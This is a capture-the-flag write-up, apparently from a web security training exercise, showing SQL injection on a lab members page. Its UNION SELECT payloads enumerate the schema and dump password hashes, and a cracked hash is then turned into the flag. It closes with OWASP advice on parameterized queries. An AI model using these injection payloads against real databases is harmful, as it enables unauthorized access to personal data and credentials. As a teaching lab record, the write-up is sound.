## How we found the flag
By doing sql inject on the memebers page (/index.php?page=member), we can find the database table schema, including table schema names, table names and column names.

### Find all column names on the users table

We are interested in finding all user information. First, we can find out database version with `1 UNION SELECT 1, version() limit 1,1`, the DB version is `5.5.64-MariaDB-1ubuntu0.14.04.1`.

> INFORMATION_SCHEMA provides access to database metadata (mysql), see [doc](https://dev.mysql.com/doc/refman/8.3/en/information-schema-table-reference.html).

Get all column names with `-1 UNION SELECT table_name, column_name FROM information_Schema.columns where table_schema=DATABASE()`, the table is called "users", and the avalaible columns are "user_id,first_name,last_name,town,country,planet,Commentaire,countersign".


### Look for information for exploiting
When trying `-1 UNION SELECT Commentaire,countersign FROM users`, the output becomes interesting:

```
ID: -1 UNION SELECT Commentaire,countersign FROM users 
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28
```

### Follow the hint
Decrypt `5ff9d0165b4f92b14994e5c685cdce28` with https://www.dcode.fr/, we get `FortyTwo`, then encrypt "fortytwo" with sh256, the result is the flag `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`


## How to exploit the breach
- Get sensitive information from the database, modify or even delete entries.

## What's the correct way
[doc](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
> Stop writing dynamic queries with string concatenation.
> Prevent malicious SQL input from being included in executed queries with Parameterized Queries.
